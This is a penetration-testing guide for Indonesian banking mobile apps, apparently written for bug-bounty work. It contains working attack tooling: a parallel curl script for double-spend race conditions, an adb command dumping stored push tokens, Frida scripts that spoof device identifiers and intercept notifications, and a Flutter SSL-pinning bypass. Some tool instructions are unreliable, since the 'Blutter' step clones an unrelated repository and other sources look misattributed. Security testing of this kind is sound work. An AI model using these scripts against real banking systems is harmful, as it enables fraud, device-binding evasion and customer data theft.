# Banking App Testing Patterns

## Common Banking App Architecture

```
┌─────────────┐     ┌──────────────┐     ┌─────────────────┐
│  Mobile App │────▶│  API Gateway │────▶│  Microservices   │
│  (Flutter/  │     │  (Kong/AWS)  │     │  - Auth          │
│   Native)   │     │              │     │  - Accounts      │
└─────────────┘     └──────────────┘     │  - Transfers     │
                           │              │  - Notifications │
                    ┌──────┴──────┐       └─────────────────┘
                    │   WAF/CDN   │              │
                    │ (Cloudflare │       ┌──────┴──────┐
                    │  /Akamai)   │       │  Database    │
                    └─────────────┘       │  (Postgres/  │
                                          │   DynamoDB)  │
                                          └─────────────┘
```

### Technology Stacks (Indonesian Banks)

| Bank | Mobile Framework | Backend | Cloud |
|------|-----------------|---------|-------|
| Jago | Flutter (likely) | Microservices | GCP |
| Jenius | React Native | Java/Spring | AWS |
| Blu | Flutter | Go/Node | GCP |
| Neobank | Native (Kotlin/Swift) | varies | varies |

### Common Security Controls

1. **Certificate Pinning** — almost all banking apps implement this
2. **Root/Jailbreak Detection** — standard, varies in sophistication
3. **Anti-Frida/Anti-Debug** — increasingly common in 2024+
4. **Device Binding** — token tied to device fingerprint
5. **Request Signing** — HMAC signature on API requests
6. **Biometric + PIN** — layered authentication
7. **Transaction Signing** — separate auth for high-value operations
8. **Screen Protection** — FLAG_SECURE on sensitive screens

---

## Banking-Specific Test Cases

### Account Opening / KYC

```bash
# Test KYC bypass:
# 1. Can we skip KYC steps? (call later API endpoints directly)
# 2. Is KYC status a client-side flag?
# 3. Can we upload fake documents and pass?
# 4. Is liveness detection bypassable? (photo of photo, video replay)

# Check KYC API flow:
# POST /api/v1/kyc/upload-id → upload ID document
# POST /api/v1/kyc/selfie → upload selfie
# POST /api/v1/kyc/liveness → liveness check
# POST /api/v1/kyc/verify → trigger verification

# Skip to verify without completing steps?
curl -X POST "https://api.target.com/v1/kyc/verify" \
  -H "Authorization: Bearer $TOKEN"
```

### Fund Transfer Security

```bash
# 1. Transfer to self (bonus/cashback abuse)
# 2. Negative amount transfer
# 3. Transfer exceeding daily limit
# 4. Transfer without PIN/biometric re-auth
# 5. Race condition on balance check
# 6. Modify beneficiary after confirmation screen
# 7. Replay transfer request (idempotency check)

# Race condition test (double-spend):
# Use GNU parallel or background curl
seq 1 5 | parallel -j5 "curl -s -X POST 'https://api.target.com/v1/transfer' \
  -H 'Authorization: Bearer $TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{\"to\":\"ACC123\",\"amount\":100,\"idempotency_key\":\"key_{}\"}'"

# Check: did 5 transfers go through or just 1?
```

### Virtual Card / Card Management

```bash
# 1. Full card number exposure in API (should be masked)
# 2. CVV accessible via API
# 3. Card freeze/unfreeze without re-auth
# 4. Create unlimited virtual cards
# 5. Card details accessible after deletion

# Test card number exposure:
curl -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/v1/cards/CARD_ID"
# Check: does response contain full PAN or masked?
```

### QR Payment / QRIS

```bash
# Indonesian banks use QRIS (QR Code Indonesian Standard)
# Test:
# 1. QR code replay (use same QR twice)
# 2. QR code manipulation (modify amount/merchant)
# 3. Expired QR still accepted?
# 4. Generate QR for negative amount
# 5. Merchant ID manipulation in QR data

# QRIS format: follows EMVCo QR standard
# Decode QR content and modify fields
```

### Push Notification Security

```bash
# 1. Push token (FCM/APNs) stored securely?
# 2. Can we register another device's push token?
# 3. Sensitive data in push notification payload?
# 4. Push notification spoofing (if token leaked)

# Check FCM token storage:
adb shell "run-as <package> cat /data/data/<package>/shared_prefs/*.xml" | grep -i "fcm\|push\|token\|registration"

# Check notification payload (via Frida):
```

```javascript
// notification_hook.js - Capture push notification content
Java.perform(function() {
    // Firebase Messaging
    try {
        var FirebaseMessagingService = Java.use('com.google.firebase.messaging.FirebaseMessagingService');
        FirebaseMessagingService.onMessageReceived.implementation = function(remoteMessage) {
            console.log('[Push] From: ' + remoteMessage.getFrom());
            console.log('[Push] Data: ' + remoteMessage.getData().toString());
            var notification = remoteMessage.getNotification();
            if (notification) {
                console.log('[Push] Title: ' + notification.getTitle());
                console.log('[Push] Body: ' + notification.getBody());
            }
            this.onMessageReceived(remoteMessage);
        };
    } catch(e) {}
});
```

### Device Binding / Multi-Device

```bash
# 1. Can we use token from device A on device B?
# 2. What device fingerprint is used? (Android ID, IMEI, hardware serial)
# 3. Can we spoof device fingerprint?
# 4. What happens when device changes? (factory reset, new phone)
# 5. Is device registration endpoint rate-limited?

# Check device fingerprint in requests:
# Look for headers like: X-Device-ID, X-Device-Fingerprint, X-Hardware-ID
# Check if it's validated server-side or just logged

# Spoof device ID via Frida:
```

```javascript
// device_spoof.js - Spoof device identifiers
Java.perform(function() {
    // Android ID
    var Settings = Java.use('android.provider.Settings$Secure');
    Settings.getString.implementation = function(resolver, name) {
        if (name === 'android_id') {
            console.log('[Device] Spoofing android_id');
            return 'deadbeef12345678';
        }
        return this.getString(resolver, name);
    };

    // Build fields
    var Build = Java.use('android.os.Build');
    Build.SERIAL.value = 'SPOOFED_SERIAL';
    Build.MODEL.value = 'Pixel 7';
    Build.MANUFACTURER.value = 'Google';
    Build.FINGERPRINT.value = 'google/raven/raven:13/TP1A.220624.021/8877034:user/release-keys';

    // TelephonyManager (IMEI - deprecated but some apps still use)
    try {
        var TelephonyManager = Java.use('android.telephony.TelephonyManager');
        TelephonyManager.getDeviceId.overload().implementation = function() {
            return '353456789012345';
        };
        TelephonyManager.getImei.overload().implementation = function() {
            return '353456789012345';
        };
    } catch(e) {}

    console.log('[+] Device spoofing loaded');
});
```

---

## Indonesian Regulatory Context (OJK)

### Required Security Controls (POJK 11/2022)

Indonesian financial apps regulated by OJK must implement:
- Multi-factor authentication
- End-to-end encryption for transactions
- Transaction limits and monitoring
- Customer data protection (UU PDP)
- Incident reporting within 24 hours

### Testing Implications

- **Transaction limits:** Test if client-side limits can be bypassed
- **MFA:** Test if second factor can be skipped or brute-forced
- **Data protection:** Check for PII exposure (UU PDP compliance)
- **Audit trail:** Check if actions are properly logged (useful for reporting impact)

---

## Flutter-Specific Testing

Many Indonesian banking apps use Flutter. Special considerations:

```bash
# Flutter apps compile Dart to native code
# Traditional decompilation (jadx) won't show business logic
# Business logic is in: lib/arm64-v8a/libapp.so (or libflutter.so)

# Tools for Flutter reverse engineering:
# 1. reFlutter - patch Flutter engine for traffic interception
pip install reflutter
reflutter target.apk
# Generates patched APK that disables SSL verification at engine level

# 2. Doldrums - Dart snapshot parser
git clone https://github.com/nicolo-ribaudo/doldrums
# Parse libapp.so to extract class/method names

# 3. Blutter - Flutter binary analysis
git clone https://github.com/aspect-build/aspect-cli
# More advanced Dart AOT analysis

# Flutter SSL pinning bypass (different from native):
# Flutter uses BoringSSL, not Android's TrustManager
# Standard Frida scripts may NOT work!
# Use reFlutter or patch libflutter.so directly
```

```javascript
// flutter_ssl_bypass.js - Bypass Flutter/Dart SSL verification
// This hooks BoringSSL's ssl_crypto_x509_session_verify_cert_chain
function bypass_flutter_ssl() {
    var m = Process.findModuleByName("libflutter.so");
    if (!m) { console.log("[-] libflutter.so not found"); return; }

    // Pattern for ssl_crypto_x509_session_verify_cert_chain
    // This varies by Flutter version - may need adjustment
    var patterns = [
        "FF C3 01 D1 FD 7B 01 A9 F4 4F 02 A9 F5 07 00 AA",  // Flutter 3.x
        "2D E9 F0 4F AD F5 C6 6D",  // Flutter 2.x (32-bit)
    ];

    for (var i = 0; i < patterns.length; i++) {
        var matches = Memory.scanSync(m.base, m.size, patterns[i]);
        if (matches.length > 0) {
            Interceptor.attach(matches[0].address, {
                onLeave: function(retval) {
                    retval.replace(0x1);  // Return true (valid)
                }
            });
            console.log("[+] Flutter SSL bypass applied at: " + matches[0].address);
            return;
        }
    }
    console.log("[-] Pattern not found - try reFlutter instead");
}

bypass_flutter_ssl();
```

---

## React Native-Specific Testing

```bash
# React Native apps bundle JavaScript
# Business logic is in: assets/index.android.bundle (Android)
# Or: main.jsbundle (iOS)

# Extract and read JS bundle:
apktool d target.apk -o rn_out/
cat rn_out/assets/index.android.bundle | js-beautify > bundle_readable.js

# Search for secrets in JS bundle:
grep -n "api_key\|secret\|password\|token\|firebase" bundle_readable.js
grep -n "https://\|http://" bundle_readable.js | sort -u

# React Native Hermes bytecode (newer apps):
# If bundle is Hermes bytecode (starts with "HBC"):
# Use hermes-dec or hbctool to decompile
pip install hbctool
hbctool disasm index.android.bundle output/
# Or: https://nicolo-ribaudo.github.io/hermes-dec/

# SSL pinning in React Native:
# Usually via react-native-ssl-pinning or TrustKit
# Standard Frida bypass usually works since it hooks native layer
```

---

## Reporting: Banking-Specific Impact Statements

When reporting findings for banking apps, frame impact in financial terms:

```markdown
## Impact Examples:

### IDOR on /accounts/{id}/balance
"An attacker can enumerate account balances of all bank customers,
exposing financial data of approximately [X] users. This violates
UU PDP Article 16 (data minimization) and could result in OJK
sanctions under POJK 11/2022."

### OTP Brute Force (no rate limiting)
"An attacker can take over any customer account by brute-forcing
the 6-digit OTP (1M combinations, ~3 hours at observed rate).
This enables unauthorized fund transfers up to the daily limit
of IDR [X] per compromised account."

### Race Condition on Transfer
"An attacker can exploit a race condition to execute multiple
transfers simultaneously, potentially overdrawing their account.
Estimated financial impact: up to IDR [daily_limit × race_factor]
per exploitation attempt."
```
